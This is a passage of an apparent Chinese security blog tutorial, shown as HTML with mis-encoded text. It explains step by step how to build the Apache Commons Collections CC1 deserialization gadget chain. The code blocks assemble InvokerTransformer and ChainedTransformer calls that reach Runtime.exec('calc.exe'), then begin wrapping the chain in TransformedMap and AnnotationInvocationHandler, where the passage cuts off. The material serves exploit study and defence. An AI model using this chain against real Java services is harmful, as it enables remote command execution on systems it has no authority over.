class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">getRuntime</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">         <span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"></span><br><span class="line"> <span class="comment">//è¿™é‡Œæ¨¡æ‹Ÿè·å–invokeæ–¹æ³•</span></span><br><span class="line"> <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">         <span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;).transform(getRuntime);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="comment">//è¿™é‡Œæ¨¡æ‹Ÿè·å–execæ–¹æ³•ï¼Œå¹¶è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, </span><br><span class="line">         <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(runtime);</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œè§£é‡Šä¸‹ä¸ºä»€ä¹ˆéœ€è¦è·å–getMethodæ–¹æ³•è€Œä¸æ˜¯ç›´æ¥è·å–getRuntimeï¼Œå› ä¸ºæˆ‘ä»¬ä¼ å…¥çš„æ˜¯Runtime.classå¯¹è±¡åœ¨InvokerTransformerç±»ä¸­çš„transformæ–¹æ³•ä¼šåœ¨è·å–å…¶classï¼Œæ‰€ä»¥å°±å˜æˆjava.lang.classå¯¹è±¡äº†ï¼Œè¿™ä¸ªç±»æ˜¯ä¸å­˜åœ¨getRuntimeæ–¹æ³•çš„æ‰€ä»¥éœ€è¦å…ˆåå°„è·å–getMethodæ–¹æ³•ï¼Œåœ¨é€šè¿‡invokeä¼ å…¥çš„Runtime.classå¯¹è±¡ï¼Œè·å¾—å…¶getruntimeæ–¹æ³•å› ä¸ºæ­¤æ—¶è·å–çš„methodå¯¹è±¡æ‰€ä»¥è¿˜éœ€è¦åœ¨åå°„è°ƒç”¨invokeæ¥å°†getruntimeçš„å®ä¾‹è·å–å‡ºã€‚æ­¤å¤„å…·ä½“å‚è€ƒ<a href="https://xz.aliyun.com/t/7031?time__1311=n4+xnD0GDti=LxQTq05+bDyCbdbd4YvjPx&alichlgref=https://xz.aliyun.com/t/12715?time__1311=mqmhDvOD7GkD8Dl6%252BG78cyuxfhDIgD0I5x&alichlgref=https%253A%252F%252Fwww.google.com%252F#toc-7">https://xz.aliyun.com/t/7031?time__1311&#x3D;n4%2BxnD0GDti%3DLxQTq05%2BbDyCbdbd4YvjPx&amp;alichlgref&#x3D;https%3A%2F%2Fxz.aliyun.com%2Ft%2F12715%3Ftime__1311%3DmqmhDvOD7GkD8Dl6%252BG78cyuxfhDIgD0I5x%26alichlgref%3Dhttps%253A%252F%252Fwww.google.com%252F#toc-7</a></p><h4 id="å¯¹äºruntimeåå°„è·å–æ”¹æˆInvokerTransformerå½¢å¼çš„è§£é‡Šï¼š"><a href="#å¯¹äºruntimeåå°„è·å–æ”¹æˆInvokerTransformerå½¢å¼çš„è§£é‡Šï¼š" class="headerlink" title="å¯¹äºruntimeåå°„è·å–æ”¹æˆInvokerTransformerå½¢å¼çš„è§£é‡Šï¼š"></a>å¯¹äºruntimeåå°„è·å–æ”¹æˆInvokerTransformerå½¢å¼çš„è§£é‡Šï¼š</h4><p><font style="color:rgb(51, 51, 51);">æ—¢ç„¶æˆ‘ä»¬æ²¡æ³•åœ¨å®¢æˆ·ç«¯åºåˆ—åŒ–å†™å…¥Runtimeçš„å®ä¾‹ï¼Œé‚£å°±è®©æœåŠ¡ç«¯æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤ç”Ÿæˆä¸€ä¸ªRuntimeå®ä¾‹å‘—ï¼Ÿ<br></font>æˆ‘ä»¬çŸ¥é“Runtimeçš„å®ä¾‹æ˜¯é€šè¿‡Runtime.getRuntime()æ¥è·å–çš„ï¼Œè€ŒInvokerTransformer<font style="color:rgb(51, 51, 51);">é‡Œé¢çš„åå°„æœºåˆ¶å¯ä»¥æ‰§è¡Œä»»æ„å‡½æ•°ã€‚<br></font>åŒæ—¶ï¼Œæˆ‘ä»¬å·²ç»æˆåŠŸæ‰§è¡Œè¿‡Runtimeç±»é‡Œé¢çš„execå‡½æ•°ã€‚è®²é“ç†è‚¯å®šæ˜¯æ²¡é—®é¢˜çš„.</p><p>æˆ‘ä»¬å…ˆçœ‹getRuntiimeæ–¹æ³•çš„å‚æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Runtime <span class="title function_">getRuntime</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> currentRuntime;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰å‚æ•°ï¼Œé‚£å°±éå¸¸ç®€å•äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//å¾—åˆ°Runtime class</span></span><br><span class="line">    <span class="comment">//ç”±äºInvokerTransformerçš„æ„é€ å‡½æ•°è¦æ±‚ä¼ å…¥Classç±»å‹çš„å‚æ•°ç±»å‹ï¼Œå’ŒObjectç±»å‹çš„å‚æ•°æ•°å€¼ï¼Œæ‰€ä»¥å°è£…ä¸€ä¸‹ï¼Œä¸‹é¢ä¹Ÿä¸€æ ·</span></span><br><span class="line">    <span class="comment">//ä¸Šé¢ä¼ å…¥Runtime.classï¼Œè°ƒç”¨Runtime classçš„getRuntimeæ–¹æ³•ï¼ˆç”±äºæ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œinvokeè°ƒç”¨é™æ€æ–¹æ³•ï¼Œä¼ å…¥ç±»å³å¯ï¼‰</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;),</span><br><span class="line">    <span class="comment">//ä¸Šé¢Runtime.getRuntime()å¾—åˆ°äº†å®ä¾‹ï¼Œä½œä¸ºè¿™è¾¹çš„è¾“å…¥(invokeè°ƒç”¨æ™®é€šæ–¹æ³•ï¼Œéœ€è¦ä¼ å…¥ç±»çš„å®ä¾‹)     </span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">transformerChain.transform(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p><font style="color:rgb(119, 119, 119);">åœ¨è¿™é‡Œï¼Œä¹‹å‰è‡ªå·±é™·å…¥äº†ä¸€ä¸ªå¾ˆå‚»é€¼çš„é—®é¢˜ï¼Œå³ï¼šInvokerTransformerç±»transformæ–¹æ³•ä¸­return method.invoke()è¿™ä¸ªè¯­å¥<br></font><font style="color:rgb(119, 119, 119);">invoke()è°ƒç”¨åˆ°åº•returnäº†å•¥?<br></font><font style="color:rgb(119, 119, 119);">å› ä¸ºåœ¨è¿™é‡Œå½¢æˆäº†ä¸€ä¸ªè°ƒç”¨returnçš„ç»“æœï¼Œå†è°ƒç”¨çš„é“¾ã€‚ä¸ºä»€ä¹ˆå°±å¯ä»¥ä¸Šä¸€ä¸ªè¾“å‡ºä½œä¸ºä¸‹ä¸€ä¸ªè¾“å…¥æ—¶ï¼Œå¯ä»¥æˆåŠŸè°ƒç”¨äº†å‘¢ï¼Ÿ<br></font><font style="color:rgb(119, 119, 119);">ä¸€å¼€å§‹ä»¥ä¸ºinvokeä¼šç»Ÿä¸€è¿”å›ä¸€ä¸ªå¯¹è±¡ä½œä¸ºä¸‹ä¸€ä¸ªè¾“å…¥ä»€ä¹ˆçš„ï¼Œå¹¶ä¸”åœ¨è°ƒè¯•çš„æ—¶å€™æ¯æ¬¡invokeçš„ç»“æœéƒ½ä¸ä¸€æ ·ï¼Œæºç çœ‹çš„å¤´æ™•ã€‚<br></font><font style="color:rgb(119, 119, 119);">å®é™…ä¸Šæ˜¯é’»äº†æ­»èƒ¡åŒï¼šinvokeçš„returnæ˜¯æ ¹æ®è¢«è°ƒç”¨çš„å‡½æ•°returnå•¥ï¼Œinvokeå°±returnå•¥ã€‚<br></font><font style="color:rgb(119, 119, 119);">å°±å¥½æ¯”æˆ‘invokeä¸€ä¸ªæˆ‘è‡ªå®šä¹‰çš„æ–¹æ³•aï¼Œåœ¨aä¸­ï¼Œæˆ‘returnäº†å­—ç¬¦ä¸²â€1â€ã€‚é‚£ä¹ˆå°±æ˜¯invokeçš„ç»“æœå°±æ˜¯å­—ç¬¦ä¸²â€1â€ã€‚<br></font>çœ‹ä»¥ä¸Šçš„è¿‡ç¨‹å°±æ˜¯ç¬¬ä¸€æ¬¡Runtime.getRuntime()çš„ç»“æœè¾“å…¥äº†ä¸‹ä¸€ä¸ªInvokerTransformer</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714491785599-c0467126-1b38-443b-b3c4-b0c79d7f1e12.png"></p><p>ä»¥ä¸Šæ„Ÿè§‰æ˜¯ä¸‡äº‹å¤§å‰äº†ï¼ä½†æ˜¯å®é™…ä¸Šå¹¶ä¸æ˜¯â€¦</p><p>å›æƒ³ä¹‹å‰å¯¹äºInvokerTransformerä¸­Class cls &#x3D; input.getClass();çš„è§£é‡Š</p><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„åˆ°input.getClass()è¿™ä¸ªæ–¹æ³•ä½¿ç”¨ä¸Šçš„ä¸€äº›åŒºåˆ«ï¼š</p><ul><li>å½“inputæ˜¯ä¸€ä¸ªç±»çš„å®ä¾‹å¯¹è±¡æ—¶ï¼Œè·å–åˆ°çš„æ˜¯è¿™ä¸ªç±»</li><li>å½“inputæ˜¯ä¸€ä¸ªç±»æ—¶ï¼Œè·å–åˆ°çš„æ˜¯java.lang.Class</li></ul><p>æˆ‘ä»¬æ¥æ¨æ¼”ç¬¬ä¸€æ¬¡InvokerTransformerçš„åå°„è°ƒç”¨ï¼Œå³å¾—åˆ°Runtimeç±»å¯¹è±¡çš„getRuntimeæ–¹æ³•è°ƒç”¨:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//InvokeTransformerå…³é”®è¯­å¥ï¼š</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;<span class="comment">//inputä¸ºæˆ‘ä»¬è®¾ç½®çš„å¸¸é‡Runtime.class</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//ï¼ï¼ï¼è¿™é‡Œç”±äºinputæ˜¯ä¸€ä¸ªç±»ï¼Œä¼šå¾—åˆ°java.lang.Class</span></span><br><span class="line"><span class="comment">//åœ¨java.lang.Classç±»ä¸­å»å¯»æ‰¾getRuntimeæ–¹æ³•ä¼å›¾å¾—åˆ°Runtimeç±»å¯¹è±¡ï¼Œæ­¤å¤„æŠ¥é”™ï¼ï¼</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">é‚£ä¹ˆæˆ‘ä»¬å¥½åƒé™·å…¥äº†ä¸€ä¸ªæ­»èƒ¡åŒï¼š<br></font><font style="color:rgb(51, 51, 51);">å¾—åˆ°Runtimeç±»å®ä¾‹æ‰èƒ½è°ƒç”¨execæ–¹æ³•ã€‚<br></font>è€Œå¾—åˆ°Runtimeç±»å®ä¾‹ä½œä¸ºinputï¼Œæ‰èƒ½å¾—åˆ°Runtime classï¼Œæ‰èƒ½æ‰¾åˆ°getRuntimeæ–¹æ³•ï¼Œå¾—åˆ°Runtimeç±»å®ä¾‹â€¦â€¦â€¦</p><p>ç¬¬äºŒç‚¹ä¹æ­¥ è¿˜æ˜¯åå°„æœºåˆ¶</p><p>é‚£ä¹ˆæˆ‘ä»¬é€šè¿‡ç›´æ¥è°ƒç”¨Runtime.getRuntimeæ–¹æ³•å¥½åƒæ˜¯è¡Œä¸é€šäº†,æœ‰æ²¡æœ‰å…¶ä»–æ–¹æ³•å‘¢ï¼Ÿ</p><p><strong>è¿˜æ˜¯åå°„æœºåˆ¶</strong></p><p>å·²çŸ¥ï¼š</p><ol><li>æˆ‘ä»¬å¼€å¤´ä¸èƒ½è·å¾—Class.forName(â€œjava.lang.Runtimeâ€)ï¼Œåªèƒ½å¾—åˆ°Class.forName(â€œjava.lang.Classâ€)</li><li><font style="color:rgb(51, 51, 51);">æˆ‘ä»¬å¯ä»¥æœ‰ä»»æ„çš„åå°„æœºåˆ¶<br></font>æ±‚ï¼š</li><li><font style="color:rgb(51, 51, 51);">æˆ‘ä»¬è¦è·å–åˆ°Runtime.getRunimeå‡½æ•°ï¼Œå¹¶æ‰§è¡Œå®ƒã€‚<br></font>è§£ï¼š</li><li>é€šè¿‡åå°„æœºåˆ¶è·å–åå°„æœºåˆ¶ä¸­çš„getMethodç±»ï¼Œç”±äºgetMethodç±»æ˜¯å­˜åœ¨Classç±»ä¸­ï¼Œå°±ç¬¦åˆå¼€å¤´Classç±»çš„é™åˆ¶</li><li>é€šè¿‡getMethodå‡½æ•°è·å–Runtimeç±»ä¸­çš„getRuntimeå‡½æ•°<ul><li>åœ¨å“ªä¸ªç±»ä¸­è°ƒç”¨getMethodå»è·å–æ–¹æ³•ï¼Œå®é™…ä¸Šæ˜¯ç”±invokeå‡½æ•°é‡Œé¢çš„çš„ç¬¬ä¸€ä¸ªå‚æ•°objå†³å®šçš„</li></ul></li><li>å†é€šè¿‡åå°„æœºåˆ¶è·å–åå°„æœºåˆ¶ä¸­çš„invokeç±»ï¼Œæ‰§è¡Œä¸Šé¢è·å–çš„getRuntimeå‡½æ•°</li><li>invokeè°ƒç”¨getRuntimeå‡½æ•°ï¼Œè·å–Runtimeç±»çš„å®ä¾‹<ul><li>è¿™é‡Œåœ¨ä½¿ç”¨åå°„æœºåˆ¶è°ƒç”¨getRuntimeé™æ€ç±»æ—¶ï¼Œinvokeé‡Œé¢ç¬¬ä¸€ä¸ªå‚æ•°objå…¶å®å¯ä»¥ä»»æ„æ”¹ä¸ºnullï¼Œæˆ–è€…å…¶ä»–ç±»ï¼Œè€Œä¸ä¸€å®šè¦æ˜¯Runtimeç±»</li></ul></li></ol><p>å…·ä½“å˜åŒ–ç»†èŠ‚ï¼Œæˆ‘é€‰æ‹©æŠŠå®ƒæ”¾åœ¨åå°„æœºåˆ¶ä¸€æ–‡ä¸­è¯´æ˜ï¼Œè¿™è¾¹ç»™å‡ºç»“æœã€‚</p><p><font style="color:rgb(51, 51, 51);">æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„æ˜¯æ‰§è¡Œ<br></font>Class.forName(â€œjava.lang.Runtimeâ€).getMethod(â€œgetRuntimeâ€).invoke(Class.forName(â€œjava.lang.Runtimeâ€)</p><p>å…ˆæ¥è·å–getRuntimeç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç›®æ ‡è¯­å¥</span></span><br><span class="line">Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>)</span><br><span class="line"><span class="comment">//ä½¿ç”¨java.lang.Classå¼€å¤´</span></span><br><span class="line">Class.forName(<span class="string">&quot;java.lang.Class&quot;</span>).getMethod(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;)</span><br><span class="line">.invoke(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>),<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//invokeå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯Runtimeç±»ï¼Œæˆ‘ä»¬éœ€è¦åœ¨Runtimeç±»ä¸­å»æ‰§è¡ŒgetMethodï¼Œè·å–getRuntimeå‚æ•°</span></span><br></pre></td></tr></table></figure><p>å¯¹ç…§ç€InvokerTransformerç±»è½¬å˜ä¸ºtransformersæ ¼å¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//cls = java.lang.Class</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes); <span class="comment">//getMethodæ–¹æ³•</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs); <span class="comment">//åœ¨Runtimeä¸­æ‰¾getRuntimeæ–¹æ³•ï¼Œå¹¶è¿”å›è¿™ä¸ªæ–¹æ³•</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="comment">//è¿˜éœ€è¦å¡«å…… è°ƒç”¨getRuntimeå¾—åˆ°Runtimeå®ä¾‹,</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿˜å·®æ‰§è¡Œè·å–åˆ°çš„getRuntimeï¼Œä¸‹ä¸€ä¸ªinputæ˜¯ä¸Šä¸€ä¸ªæ‰§è¡Œæ¥å£ï¼Œç»§ç»­å¯¹ç…§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//input=getRuntimeè¿™ä¸ªæ–¹æ³•</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();<span class="comment">//cls = java.lang.Methodï¼ˆgetRuntimeæ–¹æ³•æ˜¯methodç±»ï¼‰</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes); <span class="comment">//åœ¨methodç±»ä¸­æ‰¾åˆ°invokeæ–¹æ³•ï¼Œmethod=invokeæ–¹æ³•</span></span><br><span class="line"><span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs); <span class="comment">//è°ƒç”¨invokeæ–¹æ³•ï¼Œinput=getRuntimeè¿™ä¸ªæ–¹æ³•ï¼Œä¼ å…¥è‡ªå®šä¹‰çš„å‚æ•°</span></span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">ä»¥ä¸Šæœ€åä¸€æ­¥æœ‰ç‚¹å¤æ‚ï¼Œmethodå°±æ˜¯invokeæ–¹æ³•ï¼Œç›¸å½“äºä½¿ç”¨invokeè°ƒç”¨äº†invokeå‡½æ•°ã€‚<br></font>é¦–å…ˆthis.iMethodName, this.iParamTypesæ˜¯æ ¹æ®invokeæ¥å£è€Œå®šçš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object obj, Object... args)</span></span><br><span class="line"><span class="comment">//this.iMethodName=&quot;invoke&quot;</span></span><br><span class="line"><span class="comment">//this.iParamTypes=new Class[] &#123;Object.class, Object[].class &#125;</span></span><br><span class="line"><span class="comment">//å¤–é¢classã€Objectå°è£…æ˜¯InvokerTransformerç±»çš„æ„é€ å‡½æ•°è¦æ±‚</span></span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">æŒ‰ç…§invokeä¸­çš„inputæ‰æ˜¯å®ƒè¦è°ƒç”¨çš„ç¯å¢ƒçš„å‡†åˆ™ã€‚<br></font>invokeæ–¹æ³•.invoke(input, this.iArgs)å®é™…ä¸Šç­‰äºinput.invoke(this.iArgs)<font style="color:rgb(51, 51, 51);">ï¼Œ<br></font>è€Œinput&#x3D;getRuntimeæ–¹æ³•ï¼Œé‚£ä¹ˆåªè¦å¡«å…¥this.iArgså°±å¥½äº†</p><p><font style="color:rgb(51, 51, 51);">åˆç”±äºgetRuntimeæ˜¯ä¸ªé™æ€å‡½æ•°ï¼Œä¸ç”¨å¤ªçº ç»“è¾“å…¥objï¼Œå†™ä½œnullã€‚getRuntimeæ–¹æ³•ä¸éœ€è¦å‚æ•°ã€‚<br></font>this.iArgs&#x3D;null,new Object[0]</p><p>é‚£ä¹ˆæ•´åˆå°±å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><font style="color:rgb(51, 51, 51);">ä»¥ä¸Šä»£ç å…¶å®å°±æ˜¯ç­‰åŒäº<br></font>((Runtime)Runtime.class.getMethod(â€œgetMethodâ€,null).invoke(null,null)).exec(â€œcalc.exeâ€);</p><p>å°†ä¿®æ”¹åçš„ä»£ç é‡æ–°è¿è¡Œçœ‹çœ‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>); <span class="comment">//ç»™mapä¸€ä¸ªé”®å€¼å¯¹ï¼Œæ–¹ä¾¿éå†</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ„é€ transformedmapæ˜¯è°ƒç”¨tranform()çš„å‰ç½®æ¡ä»¶</span></span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">                map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–sun.reflect.annotation.AnnotationInvocationHandlerç±»çš„Classå¯¹è±¡</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span 